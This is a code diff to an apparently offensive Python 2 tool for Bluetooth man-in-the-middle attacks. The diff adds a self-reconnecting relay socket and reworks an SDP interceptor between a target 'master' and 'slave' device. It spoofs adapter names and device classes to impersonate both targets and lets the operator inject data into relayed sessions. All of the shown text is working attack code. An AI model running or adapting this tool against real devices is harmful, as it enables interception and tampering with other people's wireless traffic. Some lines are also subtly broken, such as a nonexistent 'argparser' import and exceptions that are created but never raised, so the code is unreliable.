@@ -1,4 +1,5 @@
 import bluetooth, sys, time, select, os
+import argparser,pickle
 from threading import Thread
 from bluetooth import *
 from btmitm_utils import *
@@ -7,59 +8,124 @@ from bluez_simple_agent import Paired
 
 
 # increments the last octet of a mac addr and returns it as string
-def inc_last_octet(addr):
-    return addr[:15] + hex((int(addr.split(':')[5], 16) + 1) & 0xff).replace('0x','').upper()
+class StickyBluetoothSocket(bluetooth.BluetoothSocket):
+    def __init__(self,address=None,proto=None, **kwargs):
+        self.not_connected = 0
+        self.connected = 1
+        self.disconnected = 2
+        self.sticky_state = self.not_connected
+        self.address = address
+        self.target = kwargs.get('target',None)
+        self.server = kwargs.get('server',False)
+        if 'sock' in kwargs:
+            proto = kwargs['sock']._proto
+        bluetooth.BluetoothSocket.__init__(self,proto,kwargs.get('sock',None))
 
-def mitm_sdp(slave,):
-    server=bluetooth.BluetoothSocket( bluetooth.L2CAP )
+    def send(self,data):
+        if self.sticky_state == self.not_connected:
+            if self.address is None: 
+                raise RuntimeError('No address is set in sticky socket')
+            self.connect(self.address)
+        elif self.sticky_state == self.disconnected:
+            self.rebuild()
+            self.connect(self.address)
+        return bluetooth.BluetoothSocket.send(self,data)
+
+    def accept(self,):
+        newsock,addr= bluetooth.BluetoothSocket.accept(self,)
+        newsock = StickyBluetoothSocket(addr, self._proto, sock=newsock)
+        newsock.sticky_state = self.connected
+        return newsock,addr
+
+    def setTarget(self, target):
+        self.target = target
+        
+    @RateLimited(25)
+    def relay(self,data):
+        try:
+            self.target.send(data)
+        except BluetoothError as e:
+            self.target.sticky_state = self.disconnected
+            self.sticky_state = self.disconnected
+            self.target.close()
+            self.target.rebuild()
+            self.error = e
+
+    def rebuild(self,):
+        bluetooth.BluetoothSocket.__init__(self,self._proto)
+        if self.server:
+            self.bind('', self.addrport[1])
+            self.listen(10)
+        self.connect(self.address)
+
+    def connect(self,addrport=None):
+        if not self.server:
+            addrport = addrport if addrport is not None else self.address
+            bluetooth.BluetoothSocket.connect(self,addrport)
+            self.sticky_state = self.connected
+        else:
+            return self.accept()
+
+def mitm_sdp(master_addr,slave_addr):
+    server=StickyBluetoothSocket( '',bluetooth.L2CAP )
     server.bind(('',1))
     server.listen(10)
-    sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
-    sock.connect((slave, 1))
-    print 'SDP interceptor started'
-    client_sock,address = server.accept()
-    print("SDP Inq from  ",address)
-    fds = [client_sock,sock,server]
+    slave_sock=StickyBluetoothSocket((slave_addr,1),bluetooth.L2CAP,)
+    master_sock=StickyBluetoothSocket((master_addr,1),bluetooth.L2CAP,)
+    slave_sock.setTarget(master_sock)
+    master_sock.setTarget(slave_sock)
+    print_verbose('SDP interceptor started')
+    fds = [server, slave_sock, master_sock]
+    c = 0
+    def clean_fds(fd):
+        if fd in fds: fds.remove(fd)
     while True:
         inputready, outputready, exceptready = select.select(fds,[],[])
         for s in inputready:
-            if s == client_sock:
-                try:
-                    data = client_sock.recv(100000)
-                    if not data: 
-                        raise RuntimeError('client dc\'d')
-                    try: sock.send(data)
-                    except Exception as e:
-                        print 'client failed ',e
-                except Exception as e:
-                    fds = [sock,server]
-                    client_sock.close()
-
-            if s == sock:
-                print 'slave sdp recv'
-                try:
-                    data = sock.recv(100000)
-                    try:
-                        client_sock.send(data)
-                    except Exception as e:
-                        print 'inquirer disconnected', e
-                        client_sock.close()
-                        fds = [sock,server]
-                except Exception as e:
-                    while True:
-                        sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
-                        try:
-                            sock.connect((slave, 1))
-                            fds = [client_sock] if len(fds) > 2 else []
-                            fds += [sock,server]
-
-                            break
-                        except Exception as e: print 'slave connect failed ',e
             if s == server:
-                client_sock,address = server.accept()
-                fds = [sock,server,client_sock]
-                print("SDP Inq from  ",address)
-
+                new_sock,address = server.accept()
+                #fds = [sock,server,client_sock]
+                if address[0] == slave_addr:
+                    print_verbose("SDP Inq from slave",address)
+                    clean_fds(slave_sock)
+                    slave_sock = new_sock
+                    fds.append(slave_sock)
+                    new_sock.setTarget(slave_sock)
+                elif address[0] == master_addr:
+                    print_verbose("SDP Inq from master",address)
+                    clean_fds(master_sock)
+                    master_sock = new_sock
+                    fds.append(master_sock)
+                    new_sock.setTarget(slave_sock)
+                    slave_sock.setTarget(master_sock)
+                else:
+                    print_verbose("SDP Inq from unknown",address)
+                    print_verbose("Guessing its from master")
+                    clean_fds(master_sock)
+                    master_sock = new_sock
+                    fds.append(master_sock)
+                    new_sock.setTarget(slave_sock)
+                    slave_sock.setTarget(new_sock)
+            else:
+                try:
+                    data = s.recv(100000)
+                    s.relay(data)
+                    print_verbose( '<<SDP>>',s.address[0], '>>' ,s.target.address[0])
+                    if s.sticky_state == s.disconnected:
+                        print_verbose('disconnected', s.error)
+                        s.close()
+                        s.target.close()
+                        s.target.rebuild()
+                        s.rebuild()
+                    elif s.target not in fds:
+                        RuntimeError('Target not in fds')
+                except BluetoothError as e:
+                    print_verbose('disconnected',e)
+                    s.close()
+                    if '104' in str(e[0]):      # Connection reset by peer
+                        s.target.close()
+                        s.target.rebuild()
+                    s.rebuild()
 
 
 class Btmitm():
@@ -71,6 +137,7 @@ class Btmitm():
         self.shared = False
         self.slave_info = {}
         self.master_info = {}
+        self.pickle_path = '.last-btmitm-pairing'
         self._options = [
                 ('target_slave',None),
                 ('target_master',None),
@@ -103,31 +170,34 @@ class Btmitm():
                 print 'Trying again ..'
                 time.sleep(1)
 
+        self.already_paired = True
+
 
     def start_service(self, service, adapter_addr=''):
         server_sock=None
-        #print 'creating server emulating  ', service
 
         if service['protocol'].lower() == 'l2cap':
             server_sock=BluetoothSocket( L2CAP )
         else:
             server_sock=BluetoothSocket( RFCOMM )
-
-        #print 'Binding to ', adapter_addr, service['protocol'] ,service['port']
-        #server_sock.bind((adapt_addr,service['port']))
         server_sock.bind(('',service['port']))
-        #print 'binded'
         server_sock.listen(1)
-        #print 'listening'
 
         port = server_sock.getsockname()[1]
 
         return server_sock
 
-    def do_mitm(self, server_sock, slave_sock, service):
-        print slave_sock
+    def do_mitm(self, server_sock, service):
+        self._do_mitm(server_sock,service)
+
+    def _do_mitm(self, server_sock, service):
+        try:
+            slave_sock = self.connect_to_svc(service)
+        except Exception as e:
+            self.barrier.wait()
+            raise e
+        self.barrier.wait()
         master_sock, client_info = server_sock.accept()
-        print master_sock,slave_sock
         print("Accepted connection from ", client_info)
         fds = [master_sock, slave_sock, sys.stdin]
         reshandler, reqhandler = self.refreshHandlers()
@@ -139,18 +209,19 @@ class Btmitm():
             recv.send(data)
 
         while True:
-            print 'Selecting...'
             inputready, outputready, exceptready = select.select(fds,[],[])
-            print 'Selected!'
             for s in inputready:
 
                 # master
                 if s == master_sock:
                     try:
                         relay(master_sock, slave_sock, reqhandler)
-                    except Exception as e:
+                    except BluetoothError as e:
                         print e, 'socket master reconnecting...'
+                        slave_sock.close()
                         master_sock, client_info = server_sock.accept()
+                        print e, 'socket slave reconnecting...'
+                        slave_sock = self.connect_to_svc(service, reconnect=True)
                         print("Accepted connection from ", client_info)
                         fds = [master_sock, slave_sock, sys.stdin]
                         break
@@ -159,7 +230,7 @@ class Btmitm():
                 if s == slave_sock:
                     try:
                         relay(slave_sock, master_sock, reshandler)
-                    except Exception as e:
+                    except BluetoothError as e:
                         print e, 'socket slave reconnecting...'
                         slave_sock = self.connect_to_svc(service, reconnect=True)
                         fds = [master_sock, slave_sock, sys.stdin]
@@ -202,18 +273,16 @@ class Btmitm():
                             print '<<', contents
                             master_sock.send(contents)
 
-                except Exception as e:
+                except BluetoothError as e:
                     print e
 
         server_sock.close() 
         master_sock.close() 
         slave_sock.close() 
 
-    
     def set_adapter_order(self,):
         """ Set the slave adapter to be the lower hciX """
         if int(self.slave_adapter[3:]) > int(self.master_adapter[3:]):
-            # swap
             tmp = self.slave_adapter
             self.slave_adapter = self.master_adapter
             self.master_adapter = tmp
@@ -244,20 +313,16 @@ class Btmitm():
             self.option(master_adapter = master_adapter)
             self.option(slave_adapter = slave_adapter)
         self.set_adapter_order()
+        enable_adapter(self.master_adapter,True)
 
         if not self.already_paired:
-            enable_adapter(self.slave_adapter,True)
-            enable_adapter(self.master_adapter,True)
-            reset_adapter(self.slave_adapter)
-            reset_adapter(self.master_adapter)
+            if not self.shared:
+                enable_adapter(self.slave_adapter,True)
+                enable_adapter(self.master_adapter,True)
+                #adapter_address(self.slave_adapter, inc_last_octet(self.target_master))
 
             # set addresses before setup
-            #adapter_address(slave_adapter, self.target_master)
-            adapter_address(self.slave_adapter, inc_last_octet(self.target_master))
-            adapter_address(self.master_adapter, inc_last_octet(self.target_slave))
-
-            reset_adapter(self.slave_adapter)
-            reset_adapter(self.master_adapter)
+            #adapter_address(self.master_adapter, inc_last_octet(self.target_slave))
 
             print 'Slave adapter: ', self.slave_adapter
             print 'Master adapter: ', self.master_adapter
@@ -266,87 +331,97 @@ class Btmitm():
             self.slave_info = lookup_info(self.target_slave)
             print 'Looking up info on master ('+self.target_master+')'
             self.master_info = lookup_info(self.target_master)
-            if args.slave_name:
-                self.option(slave_name = args.slave_name)
-            else:
-                self.option(slave_name = self.slave_info['name']+'_btmitm')
 
-            if args.master_name:
-                self.option(master_name = args.master_name)
-            else:
-                self.option(master_name = self.master_info['name']+'_btmitm')
-            if self.shared:
-                self.option(master_name = self.slave_name)
+        if 'name' not in self.slave_info or not self.slave_info['name']:
+            RuntimeError('Slave not discovered')
+        if 'name' not in self.master_info or not self.master_info['name']:
+            RuntimeError('Master not discovered')
+        if args.slave_name:
+            self.option(slave_name = args.slave_name)
+        else:
+            self.option(slave_name = self.slave_info['name']+'_btmitm')
+
+        if args.master_name:
+            self.option(master_name = args.master_name)
+        else:
+            self.option(master_name = self.master_info['name']+'_btmitm')
+        if self.shared:
+            self.option(master_name = self.slave_name)
 
 
-            # clone the slave adapter as the master device
-            print 'Spoofing master name as ', self.slave_name
-            adapter_name(self.master_adapter, self.slave_name)
+        # clone the slave adapter as the master device
+        print 'Spoofing master name as ', self.slave_name
+        adapter_name(self.master_adapter, self.slave_name)
 
-            # have the spoofed slave connect directly to master
-            """
-            if args.slave_active:
-                print 'Pairing (spoofed slave & master)...'
-                enable_adapter(master_adapter, True)
-                adapter_name(master_adapter, mn)
-                adapter_class(master_adapter, slave_info['class'])
-                enable_adapter_ssp(master_adapter,True)
-                advertise_adapter(master_adapter, True)
-                while True:
-                    try:
-                        pair_adapter(master_adapter, target_master)
-                        break
-                    except Exception as e:
-                        print e
-                        print 'Trying again ...'
-                        time.sleep(1)
-            """
-     
-            enable_adapter_ssp(self.slave_adapter,True)
-            print 'Pairing (spoofed master & slave)...'
-            print 'Spoofing slave name as ', self.master_name
-            adapter_name(self.slave_adapter, self.master_name)
+        # have the spoofed slave connect directly to master
+        #TODO
+        """
+        if args.slave_active:
+            print 'Pairing (spoofed slave & master)...'
+            enable_adapter(master_adapter, True)
+            adapter_name(master_adapter, mn)
+            adapter_class(master_adapter, slave_info['class'])
+            enable_adapter_ssp(master_adapter,True)
+            advertise_adapter(master_adapter, True)
+            while True:
+                try:
+                    pair_adapter(master_adapter, target_master)
+                    break
+                except BluetoothError as e:
+                    print e
+                    print 'Trying again ...'
+                    time.sleep(1)
+        """
+ 
+        enable_adapter_ssp(self.slave_adapter,True)
+        enable_adapter_ssp(self.master_adapter,True)
+        advertise_adapter(self.master_adapter, True)
+        print 'Spoofing slave name as ', self.master_name
+        adapter_name(self.slave_adapter, self.master_name)
+
+    def set_class(self,):
+        if not self.shared: 
+            adapter_class(self.master_adapter, self.slave_info['class'])
+            adapter_class(self.slave_adapter, self.master_info['class'])
+        else:
+            adapter_class(self.slave_adapter, self.slave_info['class'])
 
     def mitm(self,):
         self.setup_adapters()
-        
-        enable_adapter(self.master_adapter,False)
+
         if not self.already_paired:
             self.pair(self.slave_adapter,self.target_slave)
-      
-        #TODO
-        socks = self.safe_connect(self.target_slave)
-
-        enable_adapter(self.master_adapter, True)
-        enable_adapter_ssp(self.master_adapter,True)
-        advertise_adapter(self.master_adapter, True)
-
-        # open connections
-        threads = []
-        sdpthread = Thread(target =mitm_sdp, args = (self.target_slave,))
+            self.already_paired = True
+            print 'paired'
+            with open('.last-btmitm-pairing','w+') as f:
+                pickle.dump(self,f)
+                
+        self.set_class();
+        
+        sdpthread = Thread(target =mitm_sdp, args = (self.target_master,self.target_slave,))
         sdpthread.daemon = True
         sdpthread.start()
 
-        print "Hello, world", socks
-        if not self.already_paired:
-            if not self.shared: 
-                adapter_class(self.master_adapter, self.slave_info['class'])
-                adapter_class(self.slave_adapter, self.master_info['class'])
-            else:
-                adapter_class(self.slave_adapter, self.slave_info['class'])
+     
+        socks = self.safe_connect(self.target_slave)
+        self.barrier = Barrier(len(socks)+1)
+        threads = []
 
-
-
-        for (slave_sock,service) in socks:
+        for service in socks:
             print 'Beginning MiTM on ', service['name']
             server_sock = self.start_service(service)
-            #slave_sock = self.connect_to_svc(service)
-            thread = Thread(target = self.do_mitm, args = (server_sock, slave_sock, service,))
+            thread = Thread(target = self.do_mitm, args = (server_sock, service,))
             thread.daemon = True
             threads.append(thread)
 
         for thr in threads:
             thr.start()
+        self.set_class();
+
+        print('Attempting connections with %d services on slave' % len(socks))
+        self.barrier.wait()
+        self.set_class();
+        print('Now you\'re free to connect to "'+self.slave_name+'" from master device.')
 
         if not self.already_paired:
             if not self.shared: 
@@ -367,8 +442,6 @@ class Btmitm():
             i.join()
         sdpthread.join()
 
-
-                            
 
     def refreshHandlers(self):
         """
@@ -394,7 +467,7 @@ class Btmitm():
 
         while True:
             try:
-                print 'Connecting to ', device
+                print_verbose('Connecting to ', device)
                 sock=bluetooth.BluetoothSocket( socktype )
                 #if kwargs.get('restart_adapter'):
                 if 0:
@@ -404,13 +477,10 @@ class Btmitm():
                 else:
                     sock.connect((device['host'], device['port'] if device['port'] else 1))
 
-                print 'Connected'
+                print_verbose('Connected')
                 return sock
             except BluetoothError as e:
-                if '115' in e[0]:  # connection in progress
-                    print 'Connection in progress...'
-                    return sock
-                print 'Couldnt connect: ',e, e[0][0]
+                print 'Couldnt connect: ',e
                 if not kwargs.get('reconnect',False):
                     raise RuntimeError("connect_to_svc")
                 print 'Reconnecting...'
@@ -430,8 +500,8 @@ class Btmitm():
         socks = []
         for svc in services:
             try:
-                socks.append( (self.connect_to_svc(svc),svc) )
-            except Exception as e:
+                socks.append( svc )
+            except BluetoothError as e:
                 print 'Couldn\'t connect: ',e
 
         if len(services) > 0:
@@ -440,4 +510,11 @@ class Btmitm():
             raise RuntimeError('Could not lookup '+target)
 
 
+    def __eq__(self, other):
+        return (isinstance(other, self.__class__)
+            and self.target_slave == other.target_slave
+            and self.target_master == other.target_master
+            )
 
+    def __ne__(self, other):
+        return not self.__eq__(other)
